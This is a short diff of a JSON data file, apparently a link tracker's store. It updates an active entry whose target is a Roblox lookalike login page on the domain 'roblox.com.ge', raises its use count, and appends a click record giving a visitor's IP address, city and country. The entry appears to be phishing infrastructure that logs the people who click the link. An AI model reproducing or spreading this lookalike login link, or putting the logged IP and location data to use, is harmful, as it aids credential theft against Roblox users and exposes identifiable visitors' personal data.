@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1321,
+    "useCount": 1322,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10736,6 +10736,14 @@
         "city": "Meycauayan",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777394967932,
+        "ip": "85.218.111.132",
+        "country": "Switzerland",
+        "city": "Lausanne",
+        "flag": "🇨🇭",
+        "countryCode": "CH"
       }
     ]
   },
